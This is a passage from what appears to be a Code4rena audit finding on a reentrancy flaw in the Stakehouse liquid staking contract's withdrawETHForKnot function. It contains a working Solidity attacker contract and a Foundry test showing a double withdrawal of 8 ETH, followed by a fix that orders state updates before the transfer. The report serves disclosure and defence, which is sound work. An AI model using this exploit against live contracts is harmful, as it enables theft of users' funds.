ETH can only be withdrawn until the KNOT has not been staked.     /// @dev A banned node runner cannot withdraw ETH for the KNOT.      /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn     function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {         require(_recipient != address(0), "Zero address");         require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key has already withdrawn or not a part of LSD network");          address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];         require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, "Not the node runner for the smart wallet ");         require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, "Node runner is banned from LSD network");         require(associatedSmartWallet.balance >= 4 ether, "Insufficient balance");         require(             getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,             "Initials not registered"         );          // refund 4 ether from smart wallet to node runner's EOA         IOwnableSmartWallet(associatedSmartWallet).rawExecute(             _recipient,             "",             4 ether         );          // update the mapping         bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;          emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);     } ```  note the section:  ```solidity // refund 4 ether from smart wallet to node runner's EOA IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  "",  4 ether );  // update the mapping bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet; ```  if the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.  As shown in our running POC.  We need to add the import first:   ```solidity import { MockAccountManager } from "../../contracts/testing/stakehouse/MockAccountManager.sol"; ```  We can add the smart contract below:  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12  ```solidity interface IManager {     function registerBLSPublicKeys(         bytes[] calldata _blsPublicKeys,         bytes[] calldata _blsSignatures,         address _eoaRepresentative     ) external payable;     function withdrawETHForKnot(         address _recipient,          bytes calldata _blsPublicKeyOfKnot     ) external; }  contract NonEOARepresentative {      address manager;     bool state;      constructor(address _manager) payable {          bytes[] memory publicKeys = new bytes[](2);         publicKeys[0] = "publicKeys1";         publicKeys[1] = "publicKeys2";          bytes[] memory signature = new bytes[](2);         signature[0] = "signature1";         signature[1] = "signature2";          IManager(_manager).registerBLSPublicKeys{value: 8 ether}(             publicKeys,             signature,             address(this)         );          manager = _manager;      }      function withdraw(bytes calldata _blsPublicKeyOfKnot) external {         IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);     }      receive() external payable {         if(!state) {             state = true;             this.withdraw("publicKeys1");         }     }  } ```  there is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when calling withdrawETHForKnot.  We add the test case.  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35  ```solidity function testBypassIsContractCheck_POC() public {   NonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));  address wallet = manager.smartWalletOfNodeRunner(address(pass));  address reprenstative = manager.smartWalletRepresentative(wallet);  console.log("smart contract registered as a EOA representative");  console.log(address(reprenstative) == address(pass));   // to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED  MockAccountManager(factory.accountMan()).setLifecycleStatus("publicKeys1", 1);   // expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER  pass.withdraw("publicKeys1");  console.log("balance after the withdraw, expected 4 ETH, but has 8 ETH");  console.log(address(pass).balance);  } ```  we run the test:  ```solidity forge test -vv --match testWithdraw_Reentrancy_POC ```  and the result is  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testWithdraw_Reentrancy_POC() (gas: 578021) Logs:   smart contract registered as a EOA representative   true   balance after the withdraw, expected 4 ETH, but has 8 ETH   8000000000000000000  Test result: ok. 1 passed; 0 failed; finished in 14.85ms ```  the function call is   pass.withdraw("publicKeys1"), which calls  ```solidity function withdraw(bytes calldata _blsPublicKeyOfKnot) external {  IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot); } ```  which trigger:  ```solidity // refund 4 ether from smart wallet to node runner's EOA IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  "",  4 ether ); ```  which triggers reentrancy to withdraw the fund again before the public key is banned.  ```solidity receive() external payable {  if(!state) {   state = true;   this.withdraw("publicKeys1");  } } ```   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.  ```solidity  // update the mapping bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;  // refund 4 ether from smart wallet to node runner's EOA IOwnableSmartWallet(associatedSmartWallet).rawExecute(  _recipient,  "",  4 ether ); ```
